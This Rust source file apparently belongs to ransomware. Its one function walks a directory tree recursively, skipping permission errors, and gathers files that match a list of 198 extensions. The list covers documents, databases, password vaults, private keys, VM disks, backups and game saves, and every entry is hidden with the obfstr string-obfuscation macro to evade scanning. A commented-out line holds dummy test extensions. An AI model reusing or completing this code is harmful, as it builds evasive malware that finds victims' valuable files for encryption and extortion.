use walkdir::WalkDir;
use obfstr::obfstr;

//walk recursively ignore permission denied
pub fn listpath(root:String)->Vec<String>
{
   let exts:[String; 198] =  [obfstr!("JSON").to_string() ,obfstr!("3DM").to_string() ,obfstr!("3DS").to_string() ,obfstr!("7Z").to_string() ,obfstr!("ACCDB").to_string() ,obfstr!("AI").to_string() ,obfstr!("ARC").to_string() ,obfstr!("ASC").to_string() ,obfstr!("ASM").to_string() ,obfstr!("ASP").to_string() ,obfstr!("ASPX").to_string() ,obfstr!("BACKUP").to_string() ,obfstr!("BAK").to_string() ,obfstr!("BAT").to_string() ,obfstr!("BMP").to_string() ,obfstr!("BRD").to_string() ,obfstr!("BZ").to_string() ,obfstr!("BZ2").to_string() ,obfstr!("CGM").to_string() ,obfstr!("CLASS").to_string() ,obfstr!("CMD").to_string() ,obfstr!("CONFIG").to_string() ,obfstr!("CPP").to_string() ,obfstr!("CRT").to_string() ,obfstr!("CS").to_string() ,obfstr!("CSR").to_string() ,obfstr!("CSV").to_string() ,obfstr!("DB").to_string() ,obfstr!("DBF").to_string() ,obfstr!("DCH").to_string() ,obfstr!("DER").to_string() ,obfstr!("DIF").to_string() ,obfstr!("DIP").to_string() ,obfstr!("DJVUSH").to_string() ,obfstr!("DOC").to_string() ,obfstr!("DOCB").to_string() ,obfstr!("DOCM").to_string() ,obfstr!("DOCX").to_string() ,obfstr!("DOT").to_string() ,obfstr!("DOTM").to_string() ,obfstr!("DOTX").to_string() ,obfstr!("DWG").to_string() ,obfstr!("EDB").to_string() ,obfstr!("EML").to_string() ,obfstr!("FRM").to_string() ,obfstr!("GIF").to_string() ,obfstr!("GO").to_string() ,obfstr!("GZ").to_string() ,obfstr!("HDD").to_string() ,obfstr!("HTM").to_string() ,obfstr!("HTML").to_string() ,obfstr!("HWP").to_string() ,obfstr!("IBD").to_string() ,obfstr!("INC").to_string() ,obfstr!("ISO").to_string() ,obfstr!("JAR").to_string() ,obfstr!("JAVA").to_string() ,obfstr!("JPEG").to_string() ,obfstr!("JPG").to_string() ,obfstr!("JS").to_string() ,obfstr!("JSP").to_string() ,obfstr!("KDBX").to_string() ,obfstr!("KEY").to_string() ,obfstr!("LAY").to_string() ,obfstr!("LAY6").to_string() ,obfstr!("LDF").to_string() ,obfstr!("LOG").to_string() ,obfstr!("MAX").to_string() ,obfstr!("MDB").to_string() ,obfstr!("MDF").to_string() ,obfstr!("MML").to_string() ,obfstr!("MSG").to_string() ,obfstr!("MYD").to_string() ,obfstr!("MYI").to_string() ,obfstr!("NEF").to_string() ,obfstr!("NVRAM").to_string() ,obfstr!("ODB").to_string() ,obfstr!("ODG").to_string() ,obfstr!("ODP").to_string() ,obfstr!("ODS").to_string() ,obfstr!("ODT").to_string() ,obfstr!("OGG").to_string() ,obfstr!("ONETOC2").to_string() ,obfstr!("OST").to_string() ,obfstr!("OTG").to_string() ,obfstr!("OTP").to_string() ,obfstr!("OTS").to_string() ,obfstr!("OTT").to_string() ,obfstr!("P12").to_string() ,obfstr!("PAQ").to_string() ,obfstr!("PAS").to_string() ,obfstr!("PDF").to_string() ,obfstr!("PEM").to_string() ,obfstr!("PFX").to_string() ,obfstr!("PHP").to_string() ,obfstr!("PHP3").to_string() ,obfstr!("PHP4").to_string() ,obfstr!("PHP5").to_string() ,obfstr!("PHP6").to_string() ,obfstr!("PHP7").to_string() ,obfstr!("PHPS").to_string() ,obfstr!("PHTML").to_string() ,obfstr!("PL").to_string() ,obfstr!("PNG").to_string() ,obfstr!("POT").to_string() ,obfstr!("POTM").to_string() ,obfstr!("POTX").to_string() ,obfstr!("PPAM").to_string() ,obfstr!("PPK").to_string() ,obfstr!("PPS").to_string() ,obfstr!("PPSM").to_string() ,obfstr!("PPSX").to_string() ,obfstr!("PPT").to_string() ,obfstr!("PPTM").to_string() ,obfstr!("PPTX").to_string() ,obfstr!("PS1").to_string() ,obfstr!("PSD").to_string() ,obfstr!("PST").to_string() ,obfstr!("PY").to_string() ,obfstr!("RAR").to_string() ,obfstr!("RAW").to_string() ,obfstr!("RB").to_string() ,obfstr!("RTF").to_string() ,obfstr!("SAV").to_string() ,obfstr!("SCH").to_string() ,obfstr!("SHTML").to_string() ,obfstr!("SLDM").to_string() ,obfstr!("SLDX").to_string() ,obfstr!("SLK").to_string() ,obfstr!("SLN").to_string() ,obfstr!("SNT").to_string() ,obfstr!("SQ3").to_string() ,obfstr!("SQL").to_string() ,obfstr!("SQLITE3").to_string() ,obfstr!("SQLITEDB").to_string() ,obfstr!("STC").to_string() ,obfstr!("STD").to_string() ,obfstr!("STI").to_string() ,obfstr!("STW").to_string() ,obfstr!("SUO").to_string() ,obfstr!("SVG").to_string() ,obfstr!("SXC").to_string() ,obfstr!("SXD").to_string() ,obfstr!("SXI").to_string() ,obfstr!("SXM").to_string() ,obfstr!("SXW").to_string() ,obfstr!("TAR").to_string() ,obfstr!("TBK").to_string() ,obfstr!("TGZ").to_string() ,obfstr!("TIF").to_string() ,obfstr!("TIFF").to_string() ,obfstr!("TXT").to_string() ,obfstr!("UOP").to_string() ,obfstr!("UOT").to_string() ,obfstr!("VB").to_string() ,obfstr!("VBS").to_string() ,obfstr!("VCD").to_string() ,obfstr!("VDI").to_string() ,obfstr!("VHD").to_string() ,obfstr!("VMDK").to_string() ,obfstr!("VMEM").to_string() ,obfstr!("VMSD").to_string() ,obfstr!("VMSN").to_string() ,obfstr!("VMSS").to_string() ,obfstr!("VMTM").to_string() ,obfstr!("VMTX").to_string() ,obfstr!("VMX").to_string() ,obfstr!("VMXF").to_string() ,obfstr!("VSD").to_string() ,obfstr!("VSDX").to_string() ,obfstr!("VSWP").to_string() ,obfstr!("WAR").to_string() ,obfstr!("WB2").to_string() ,obfstr!("WK1").to_string() ,obfstr!("WKS").to_string() ,obfstr!("XHTML").to_string() ,obfstr!("XLC").to_string() ,obfstr!("XLM").to_string() ,obfstr!("XLS").to_string() ,obfstr!("XLSB").to_string() ,obfstr!("XLSM").to_string() ,obfstr!("XLSX").to_string() ,obfstr!("XLT").to_string() ,obfstr!("XLTM").to_string() ,obfstr!("XLTX").to_string() ,obfstr!("XLW").to_string() ,obfstr!("YML").to_string() ,obfstr!("ZIP").to_string() ,obfstr!("DAT").to_string() ,obfstr!("M4A").to_string() ,obfstr!("AVI").to_string() ,obfstr!("d3dbsp").to_string() ,obfstr!("sc2save").to_string() ,obfstr!("sie").to_string() ,obfstr!("sum").to_string() ,obfstr!("bkp").to_string() ,obfstr!("flv").to_string() ,obfstr!("XML").to_string()];
   //let exts:[String; 2] =  [obfstr!("zok").to_string(),obfstr!("zokk").to_string()];
    let mut files: Vec<String> = Vec::new();
    for entry in WalkDir::new(root).into_iter().filter_map(|e| e.ok())
    {
        let file = entry.path().display().to_string();
       //extensions
        match file.split(".").last()
        {
            Some(ex)=> 
            {
                for ext in exts.iter()
                {
                    if ex.to_lowercase() == ext.to_lowercase()
                    {
                        files.push(file.to_owned());
                    }
                }
            },
            None=>continue,
        }
    }
    
    return files;
}


